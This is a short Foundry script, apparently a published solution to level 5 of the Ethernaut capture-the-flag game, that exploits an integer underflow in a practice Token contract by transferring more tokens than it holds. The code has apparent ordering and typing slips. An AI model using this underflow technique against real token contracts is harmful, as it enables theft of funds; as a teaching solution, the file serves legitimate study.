// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {Token} from "src/05/Token.sol";

contract Exploit is Script {

        Token level = Token(instance); 
        address instance = vm.envAddress("INSTANCE_LEVEL5");
        address hacker = vm.envAddress("PRIVATE_KEY");          
        
        function run() external {

            vm.startBroadcast(hacker);
            level.transfer(address(0), 21);
            vm.stopBroadcast();
    }
}
